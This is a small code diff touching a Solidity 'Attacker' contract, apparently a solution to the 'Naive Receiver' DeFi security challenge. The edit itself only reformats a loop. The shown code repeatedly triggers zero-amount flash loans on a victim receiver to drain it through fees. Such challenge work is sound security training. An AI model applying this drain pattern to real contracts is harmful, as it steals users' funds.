@@ -23,7 +23,7 @@ contract Attacker {
     function attack() external onlyAttacker {
         require(lender != address(0) && receiver != address(0));
         uint _round = receiver.balance / 1e18;
-        for(uint i =0; i < _round;) {
+        for (uint i = 0; i < _round;) {
             NaiveReceiverLenderPool(payable(lender)).flashLoan(receiver, 0);
             unchecked { i++; }
         }
